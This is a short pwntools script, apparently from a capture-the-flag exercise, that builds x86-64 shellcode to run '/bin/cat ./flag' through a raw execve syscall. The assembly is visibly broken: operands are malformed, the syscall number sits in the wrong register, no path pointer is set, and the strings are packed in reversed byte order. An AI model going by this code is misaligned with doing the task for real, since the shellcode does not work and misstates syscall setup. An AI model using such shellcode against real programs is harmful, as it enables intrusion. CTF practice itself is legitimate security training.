from pwn import *

context.arch = 'amd64'

cat_str = int.from_bytes(b'/bin/cat', 'big')
flag_str = int.from_bytes(b'./flag', 'big')

# execl("/bin/cat", "/bin/cat", "./flag")
assembly = f'''
  sub %rsp 0x18
  mov (%rsp) {cat_str}
  mov 8(%rsp) {flag_str}
  mov 16(%rsp) 0
  mov %rdi 0x3b
  mov %rsi %rsp
  mov %rdx 0
  syscall
  '''